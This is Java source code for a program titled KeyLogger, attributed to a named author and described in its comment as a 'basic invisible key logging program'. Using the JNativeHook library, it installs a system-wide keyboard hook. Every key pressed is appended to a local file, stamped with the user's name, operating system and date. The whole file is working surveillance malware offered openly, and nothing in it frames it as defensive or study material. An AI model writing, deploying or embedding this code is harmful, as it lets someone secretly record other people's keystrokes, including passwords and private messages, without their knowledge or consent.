import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.*;
import java.util.Date;

public class KeyLogger {

    //Logged keys destination FILE
    static File loggedKeysFile = new File("loggedKeys.txt");

    public static void main(String[] args) throws NativeHookException, IOException {

        logIn();

        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(nativeKeyListener);

    }

    //Key logged to "loggedKeys.txt" file
    static NativeKeyListener nativeKeyListener = new NativeKeyListener() {
        @Override
        public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
            NativeKeyListener.super.nativeKeyTyped(nativeEvent);
        }

        @Override
        public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
            NativeKeyListener.super.nativeKeyPressed(nativeEvent);
            String keyText = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());

            try {
                PrintWriter writer = new PrintWriter(new FileWriter(loggedKeysFile, true));
                writer.print(keyText);
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

        }

        @Override
        public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
            NativeKeyListener.super.nativeKeyReleased(nativeEvent);
        }
    };

    //PC and DATE information file display
    static void logIn() throws IOException {

        Date date = new Date();

        PrintWriter writer = new PrintWriter(new FileWriter(loggedKeysFile, true));
        writer.print("\nPC Details: " + System.getProperty("user.name") + " " + System.getProperty("os.name")+" | Date: "+date+"\n");
        writer.close();

    }

}

/*

    Title: KeyLogger

    Author: Maciej Sepeta

    Description: Basic invisible key logging program

    ver. 0.1.0

 */